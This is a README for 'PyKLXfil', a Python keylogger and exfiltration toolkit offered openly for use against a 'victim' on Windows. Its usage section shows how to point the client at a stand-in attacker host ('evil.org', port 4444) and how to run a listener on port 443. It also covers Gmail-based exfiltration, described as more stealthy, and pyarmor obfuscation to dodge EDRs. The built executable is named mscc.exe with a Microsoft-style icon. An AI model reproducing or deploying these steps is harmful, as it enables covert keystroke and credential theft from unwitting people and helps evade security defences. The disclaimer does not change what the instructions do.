# PyKLXfil: Python Keylogger and Exfiltrator.
## The toolset contains four main tools:
* PyKLXfil-Server: a socket server to recieve the exfiltrated data from a victem.
* PyKLXfil-Client: the agent that will perform the encoded key logging with a custome base64 table and the exfiltration of data back to PyKLXfil-Server.
* PyKLXfil-Client-mail: a standalone agent that will perform encoded key logging with a custome base64 table and exfiltration to a gmail email account (more stealthy).
* PyKLXfil-Decoder: a tool to decode the key logs.
#### Disclaimer: For educational purpose, use at your own responsibility.
## Install:
```sh
  git clone https://github.com/iD4rksid3/PyKLXfil.git
  cd PyKLXfil
  #The tool requires only two external modules: yagmail and pynput
  pip3 install -r requirements.txt
  ```
## Usage:
### Key logging and exfiltration using socket server and client:
* On the server, start listening on all NICs and on port 443 as background job:
```sh
python3 PyKLXfil-Server.py 0.0.0.0 443 &
```
* For the client, edit PyKLXfil-Client.py and add your server's IP/domain and port then compile and obfuscate the script for a windows machine:
```sh
 nano PyKLXfil-Client.py
 #snip...       
 #self.host = 'evil.org'
 #self.port = 4444
 ```
 * Make Windows executable client by either of the ways:
 1. obfuscated Windows executable with [pyarmor](https://github.com/dashingsoft/pyarmor) to make it less detectable by EDRs:
 ```sh
 pip3 install pyarmor
 pip3 install pyinstaller
 pyarmor pack --clean -e "--onefile -w -i ms.ico --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32" PyKLXfil-Client.py -n mscc.exe
 ```
 OR:
 2. Compile the script to exe using pyinstaller:
```sh
pyinstaller --onefile -w -i ms.ico --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32 -n mscc.exe PyKLXfil-Client.py
```
* Once the client is deployed on a Windows machine it will start key logging and exfiltrate them back to the server.
### Key logging and exfiltration using gmail (more stealthy):
* Compile and obfuscate the python gmail client for a windows machine (stand alone):
* Note: you will first need to get app password token to be used in the script, a good guide can be found [here](https://towardsdatascience.com/automate-sending-emails-with-gmail-in-python-449cc0c3c317)
```sh
nano PyKLXfil-Client-mail.py
 #snip...       
  #user = 'example@gmail.com'
  #app_password = 'qweertyuiop12345678'
  #to = 'example@gmail.com'
```
* Make obfuscated executable with [pyarmor](https://github.com/dashingsoft/pyarmor) to make it less detectable by EDRs:
 ```sh
 pip3 install pyarmor
 pip3 install pyinstaller
 pyarmor pack --clean -e "--onefile -w -i ms.ico --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32" PyKLXfil-Client-mail.py -n mscc.exe
 ```
 * After recieving the encoded log files, PyKLXfil-Decoder.py can be used to decode them:
```sh
python3 PyKLXfil-Decoder.py xxxx.log
#will result in a decoded file Decoded-xxxx.log
```
## License

Distributed under the MIT License. See `LICENSE` for more information.
